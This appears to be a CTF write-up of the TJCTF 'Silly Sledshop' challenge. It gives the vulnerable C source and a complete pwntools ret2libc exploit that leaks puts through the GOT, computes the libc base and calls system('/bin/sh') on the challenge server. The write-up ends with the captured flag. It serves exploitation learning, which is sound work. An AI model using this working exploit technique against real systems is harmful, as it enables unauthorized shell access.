## TJCTF: Silly Sledshop
##### *ret2libc leak + maybe other approaches*
#### I might be ashamed to say this but this challenge got me stuck on it for the duration of the competition. Initially, I thought I was going to solve it through buffer overflow plus nopsleds to execute shellcode, but I had problems regarding some addresses *(solution for this approach soon). After some asking around for nudges, I opted to go for the ret2libc attack on the challenge server, which I got stuck on again, but eventually solved it, hours after the ctf ended. From this, I conclude that there are a lot of things for me to learn, new attacks and approaches to read on and experiment about. 
#### First things first, we examine the binary and it's security measures with ```file``` and ```checksec```:
```
$ file sledshop
sledshop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=28fae6ecbea7effce8bcd28dd0e53dbd40ecd702, not stripped

$ checksec sledshop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
#### From here, we see that we're dealing with a 32-bit binary with most security measures turned off. So we can say that this is vulnerable to buffer overflow attacks given that no canary is found on the stack. Shellcoding is another way to go, but that will be for another part, I'll tackle the ret2libc approach. It's also important to know that we have the source code for the binary:
```c
#include <stdio.h>
#include <stdlib.h>

void shop_setup() {
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    setbuf(stdout, NULL);
}

void shop_list() {
    printf("The following products are available:\n");
    printf("|  Saucer  | $1 |\n");
    printf("| Kicksled | $2 |\n");
    printf("| Airboard | $3 |\n");
    printf("| Toboggan | $4 |\n");
}

void shop_order() {
    int canary = 0;
    char product_name[64];

    printf("Which product would you like?\n");
    gets(product_name);

    if (canary)
        printf("Sorry, we are closed.\n");
    else      
        printf("Sorry, we don't currently have the product %s in stock. Try again later!\n", product_name);
}

int main(int argc, char **argv) {
    shop_setup();
    shop_list();
    shop_order();
    return 0;
}
```
#### We see here some functions such as shop_setup and shop_list which just prints out and sets the permissions to the binary. What we do want to be interested in is the ```shop_order``` function, which uses a gets call for user input. As we know we can smash the stack using this vulnerable call so what we have to do now is to determine the offset needed to overwrite the instruction pointer.
```
$ gdb ./sledshop
  gdb-peda$ pattern create 100
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
  
  gdb-peda$ r
  The following products are available:
  |  Saucer  | $1 |
  | Kicksled | $2 |
  | Airboard | $3 |
  | Toboggan | $4 |
  Which product would you like?
  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
  [...]
  EIP: 0x41414a41 ('AJAA')
  Stopped reason: SIGSEGV
  0x41414a41 in ?? ()
  
  gdb-peda$ pattern offset AAJA
  AAJA found at offset: 80
```
#### We were able to overwrite the eip register with offset 80. But after that, where do we want to jump to? Since we're performing a ret2libc attack here, we follow the usual approach - we jump to the system function, add some address we want to exit to, and we supply the address of the /bin/sh string to be an argument for the system function. The catch here is that ASLR is enabled server side; hardcoding addresses won't help. So what we have to do now is to leak addresses of functions from the server. We do this by ```getting the address of the puts function in the plt, return to the shop_order function to prevent program termination, and supply the address of the puts function in the got to its plt counterpart```
```
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x80483f0 <puts@plt>

gdb-peda$ disas puts
Dump of assembler code for function puts@plt:
   0x080483f0 <+0>:	  jmp    DWORD PTR ds:0x804a01c
   0x080483f6 <+6>:	  push   0x20
   0x080483fb <+11>:	jmp    0x80483a0
End of assembler dump.

gdb-peda$ p shop_order 
$2 = {<text variable, no debug info>} 0x80485bc <shop_order>
```
#### We take note of these addresses: puts@plt is at 0x80483f0, puts@got is at 0x804a01c, and the shop_order function is at 0x80485bc. We can now craft our initial payload to leak, send it to the server, and take note of the leaked address:
```python
#: Exploit code; Stage 1
offset = 'A' * 80
puts_plt = 0x080483f0
puts_got = 0x0804a01c
shop_order = 0x080485bc
exploit = offset + p32(puts_plt) + p32(shop_order) + p32(puts_got)

#: Send payload; Leak puts
p.sendline(exploit)
print(p.recv())
puts_leak = u32(p.recv().split()[4][:4])
```
#### Since ASLR is enabled on the challenge server, the address that we leaked will be different every time we run our script. After leaking the address of puts from the server, we input the last three bytes (even with ASLR, the last three bytes will always be constant) of what we have to ```libc.blukat.me``` to find out which version of libc the server uses and to know at what offsets our ingredients for ret2libc reside. 
```
libc6-i386_2.23-0ubuntu11_amd64 
  Symbol	    Offset	 
	system	    0x03a940	
	puts	      0x05f140	
	open	      0x0d3f40	
	read	      0x0d4350	
	write	      0x0d43c0	
	str_bin_sh	0x15902b	
  exit        0002e7b0
```
#### Great! Now we have the offsets for the ingredients we need for our exploit. But first, we need to calculate the base address for the libc using the formula ```libc_base = puts_leak - puts_offset```. After which, we add the offsets for the functions and variables we need to the libc_base to get their exact address in the libc. 
```python
libc_base = puts_leak - 0x5f140
system = libc_base + 0x3a940
exit = libc_base + 0x2e7b0
bin_sh = libc_base + 0x15902b
```
#### When we have already done that, we proceed with our usual exploit method - overflow the buffer, jump to system and get shell. For our final script:
```python
from pwn import *

#: Connect to chalenge server 
HOST = 'p1.tjctf.org'
PORT = 8010
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code; Stage 1
offset = 'A' * 80
puts_plt = 0x080483f0
puts_got = 0x0804a01c
shop_order = 0x080485bc
exploit = offset + p32(puts_plt) + p32(shop_order) + p32(puts_got)

#: Send payload; Leak puts
p.sendline(exploit)
print(p.recv())
puts_leak = u32(p.recv().split()[4][:4])
print(hex(puts_leak))

#: Exploit code; Stage 2
offset = 'A' * 80
libc_base = puts_leak - 0x5f140

system = libc_base + 0x3a940
exit = libc_base + 0x2e7b0
bin_sh = libc_base + 0x15902b

exploit = offset + p32(system) + p32(exit) + p32(bin_sh)

#: Send payload; Stage 2
p.sendline(exploit)
print(p.recv())
print(p.recv())
p.interactive()
```
#### We run the exploit, get shell, and cat out the flag! :)
```
$ python exploit.py
[+] Opening connection to p1.tjctf.org on port 8010: Done
The following products are available:

|  Saucer  | $1 |
| Kicksled | $2 |
| Airboard | $3 |
| Toboggan | $4 |
Which product would you like?

Sorry, we are closed.

[*] Switching to interactive mode
$ ls
flag.txt
sledshop
wrapper
$ cat flag.txt
tjctf{5l3dd1n6_0mk4r_15_h4ppy_0mk4r}
```
  
